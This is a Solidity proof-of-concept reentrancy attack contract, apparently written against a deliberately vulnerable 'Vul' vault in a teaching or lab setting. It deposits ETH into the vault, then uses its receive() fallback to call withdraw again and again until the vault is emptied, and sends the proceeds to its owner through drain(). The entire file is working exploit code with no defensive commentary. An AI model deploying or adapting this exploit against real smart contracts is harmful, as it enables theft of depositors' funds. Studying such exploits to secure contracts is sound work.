// SPDX-License-Identifier: MIT
import {Vul} from './Vul.sol';
pragma solidity ^0.8.31;

contract VulAttack {
  Vul public immutable vault;
  address public immutable owner;
  uint256 public attackAmount;
  uint256 public totalBalance;

  constructor(address _vault) {
    vault = Vul(_vault);
    owner = msg.sender;
  }

  function depositValue() external payable {
    require(msg.value > 0, 'Need ETH to attack');
    attackAmount = msg.value;

    vault.deposit{value: msg.value}();
  }

  function attack(uint _amount) external payable {
    require(_amount > 0, 'Need ETH to attack');

    vault.withdraw(_amount);
  }

  receive() external payable {
    if (address(vault).balance >= attackAmount) {
      totalBalance += attackAmount;
      vault.withdraw(attackAmount);
    }
  }

  function drain() external {
    require(msg.sender == owner, 'Not owner');
    (bool ok, ) = owner.call{value: address(this).balance}('');
    require(ok);
  }
}
